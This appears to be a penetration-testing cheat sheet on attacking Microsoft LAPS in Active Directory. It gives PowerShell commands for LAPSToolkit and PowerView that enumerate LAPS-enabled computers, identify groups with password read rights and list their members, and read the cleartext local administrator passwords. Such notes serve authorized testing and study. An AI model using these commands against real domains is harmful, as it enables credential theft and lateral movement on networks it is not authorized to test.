# Local Administrator Password Service

Contains Local Admin Password

Introduces 2 attributes into computer in the Active Directory:
- ms-mcs-AdmPwdExpirationTime -> Registers expiration time of the password
- ms-mcs-AdmPwd -> Contains cleartext password

LAPS uses `admpwd.dll` to change the local admin password, pushed into `ms-mcs-AdmPwd`

To attack LAPS, use:
- https://github.com/leoloobeek/LAPSToolkit

## Import LAPSToolKit

```powershell
Import-Module .\LAPSToolkit.ps1
```

## Enumerate Computers with LAPS Configured

```powershell
Get-LAPSComputers
```

## Find Groups with LAPS Read Permissions

```powershell
Find-LAPSDelegatedGroups
```

## Enumerate Members of groups with LAPS Read Permissions

```powershell
# Load PowerView
Import-Module .\PowerView.ps1

Get-NetGroupMember -GroupName "LAPS Password Readers"
```

```powershell
# Start powershell as administrator
# Read LAPS Password
Get-LAPSComputers

# The output shows the computer name and the LAPS password
```